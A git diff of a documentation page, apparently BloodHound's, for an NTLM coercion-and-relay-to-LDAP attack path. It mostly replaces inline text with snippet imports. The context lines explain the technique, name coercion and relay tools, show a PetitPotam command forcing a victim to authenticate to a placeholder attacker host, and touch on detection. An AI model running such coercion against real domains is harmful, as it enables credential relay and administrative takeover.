@@ -3,13 +3,20 @@ title: CoerceAndRelayNTLMToLDAP
 description: The target computer can be coerced to authenticate via NTLM to an LDAP service on a domain controller that does not require LDAP signing, allowing an attacker to abuse Active Directory permissions or obtain administrative access to the target computer.
 ---
 
-<img noZoom src="/assets/enterprise-AND-community-edition-pill-tag.svg" alt="Applies to BloodHound Enterprise and CE"/>
+import ResourceEditionPill from '/snippets/resources/edition-pill.mdx';
+import NtlmRelayGuidance from '/snippets/edges/ntlm-relay-guidance.mdx';
+import NtlmCoercionMethods from '/snippets/edges/ntlm-coercion-methods.mdx';
+import NtlmWebclientCoercionNote from '/snippets/edges/ntlm-webclient-coercion-note.mdx';
+import NtlmInveighRelay from '/snippets/edges/ntlm-inveigh-relay.mdx';
+import NtlmRelayDetection from '/snippets/edges/ntlm-relay-detection.mdx';
+
+<ResourceEditionPill />
 
 This edge indicates that the target computer has the WebClient service running. This enables an attacker with "Authenticated Users" access to trigger WebClient-based coercion from the target computer to their attacker-controlled host via NTLM. Since the connection originates from the WebClient instead of SMB, the attacker can relay the authentication attempt to the LDAP service of a domain controller that does not require LDAP signing. This relay can be used to abuse Active Directory permissions or obtain administrative access to the target computer using Resource-Based Constrained Delegation (RBCD) or Shadow Credentials.
 
 ## Abuse Info
 
-This section provides general guidance about abusing this edge. For detailed instructions, see [references](#references) at the end of this article.
+<NtlmRelayGuidance />
 
 ### Linux
 
@@ -23,14 +30,14 @@ This section provides general guidance about abusing this edge. For detailed ins
 
 1. **Coerce the Target Computer**
 
-   Several coercion methods are documented here: [Windows Coerced Authentication Methods](https://github.com/p0dalirius/windows-coerced-authentication-methods).
+   <NtlmCoercionMethods />
 
    Examples of tools include:
 
    - [printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
    - [PetitPotam](https://github.com/topotam/PetitPotam)
 
-   To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: `\\SERVER_NETBIOS@PORT/PATH/TO/FILE`.
+   <NtlmWebclientCoercionNote />
 
    ```bash
    petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS@PORT/file.txt" "VICTIM_IP"
@@ -40,11 +47,13 @@ This section provides general guidance about abusing this edge. For detailed ins
 
 1. **Start the Relay Server**
 
-   The NTLM relay can be executed with [Inveigh](https://github.com/Kevin-Robertson/Inveigh).
+   <NtlmInveighRelay />
 
 1. **Coerce the Target Computer**
 
-   Several coercion methods are documented here: [Windows Coerced Authentication Methods](https://github.com/p0dalirius/windows-coerced-authentication-methods). Examples of tools include:
+   <NtlmCoercionMethods />
+
+   Examples of tools include:
    
    - [SpoolSample](https://github.com/leechristensen/SpoolSample)
    - [PetitPotam](https://github.com/topotam/PetitPotam)
@@ -59,7 +68,7 @@ This section provides general guidance about abusing this edge. For detailed ins
 
 ## Opsec Considerations
 
-NTLM relayed authentications can be detected by login events where the IP address does not match the computer's actual IP address. This detection technique is described in the blog post: [Detecting NTLM Relay Attacks](https://posts.bluraven.io/detecting-ntlm-relay-attacks-d92e99e68fb9).
+<NtlmRelayDetection />
 
 ## Edge Schema
 
